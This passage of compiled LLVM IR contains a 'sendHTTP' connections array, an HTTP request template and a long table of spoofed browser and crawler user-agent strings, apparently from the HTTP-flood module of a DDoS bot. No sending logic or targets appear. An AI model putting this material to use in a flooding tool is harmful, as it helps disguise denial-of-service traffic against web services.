x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.475, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.485, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.486, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.487, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @.str.488, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.489, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.490, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([195 x i8], [195 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.465, i32 0, i32 0), i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.491, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.492, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.493, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.494, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.495, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.496, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.497, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.475, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.485, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.486, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.487, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @.str.488, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.489, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.490, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.404, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.498, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.500, i32 0, i32 0)], align 16
@.str.501 = private unnamed_addr constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00", align 1
@.str.498 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.499 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.500 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.196 = private unnamed_addr constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00", align 1
@.str.197 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@.str.198 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.199 = private unnamed_addr constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00", align 1
@.str.200 = private unnamed_addr constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00", align 1
@.str.201 = private unnamed_addr constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00", align 1
@.str.202 = private unnamed_addr constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00", align 1
@.str.203 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.204 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.205 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.206 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.207 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.208 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.209 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.210 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.211 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.212 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.213 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.214 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.215 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.216 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.217 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.218 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.219 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.220 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.221 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.222 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.223 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.224 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.225 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.226 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.227 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.228 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.229 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.230 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.231 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.232 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.233 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.234 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.235 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.236 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.237 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.238 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.239 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.240 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.241 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.242 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.243 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.244 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.245 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.246 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.247 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00", align 1
@.str.248 = private unnamed_addr constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.249 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.250 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00", align 1
@.str.251 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.252 = private unnamed_addr constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00", align 1
@.str.253 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00", align 1
@.str.254 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.255 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.256 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.257 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.258 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00", align 1
@.str.259 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00", align 1
@.str.260 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00", align 1
@.str.261 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.262 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.263 = private unnamed_addr constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.264 = private unnamed_addr constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.265 = private unnamed_addr constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.266 = private unnamed_addr constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.267 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.268 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.269 = private unnamed_addr constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00", align 1
@.str.270 = private unnamed_addr constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00", align 1
@.str.271 = private unnamed_addr constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00", align 1
@.str.272 = private unnamed_addr constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00", align 1
@.str.273 = private unnamed_addr constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00", align 1
@.str.274 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.275 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00", align 1
@.str.276 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.277 = private unnamed_addr constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00", align 1
@.str.278 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.279 = private unnamed_addr constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00", align 1
@.str.280 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.281 = private unnamed_addr constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00", align 1
@.str.282 = private unnamed_addr constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00", align 1
@.str.283 = private unnamed_addr constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.284 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.285 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.286 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.287 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.288 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00", align 1
@.str.289 = private unnamed_addr constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00", align 1
@.str.290 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00", align 1
@.str.291 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00", align 1
@.str.292 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00", align 1
@.str.293 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00", align 1
@.str.294 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00", align 1
@.str.295 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00", align 1
@.str.296 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.297 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.298 = private unnamed_addr constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.299 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00", align 1
@.str.300 = private unnamed_addr constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00", align 1
@.str.301 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00", align 1
@.str.302 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.303 = private unnamed_addr constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00", align 1
@.str.304 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00", align 1
@.str.305 = private unnamed_addr constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00", align 1
@.str.306 = private unnamed_addr constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00", align 1
@.str.307 = private unnamed_addr constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00", align 1
@.str.308 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00", align 1
@.str.309 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.310 = private unnamed_addr constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00", align 1
@.str.311 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.312 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.313 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.314 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.315 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00", align 1
@.str.316 = private unnamed_addr constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00", align 1
@.str.317 = private unnamed_addr constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00", align 1
@.str.318 = private unnamed_addr constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00", align 1
@.str.319 = private unnamed_addr constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00", align 1
@.str.320 = private unnamed_addr constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00", align 1
@.str.321 = private unnamed_addr constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00", align 1
@.str.322 = private unnamed_addr constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00", align 1
@.str.323 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00", align 1
@.str.324 = private unnamed_addr constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00", align 1
@.str.325 = private unnamed_addr constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00", align 1
@.str.326 = private unnamed_addr constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00", align 1
@.str.327 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00", align 1
@.str.328 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00", align 1
@.str.329 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00", align 1
@.str.330 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00", align 1
@.str.331 = private unnamed_addr constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00", align 1
@.str.332 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00", align 1
@.str.333 = private unnamed_addr constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00", align 1
@.str.334 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00", align 1
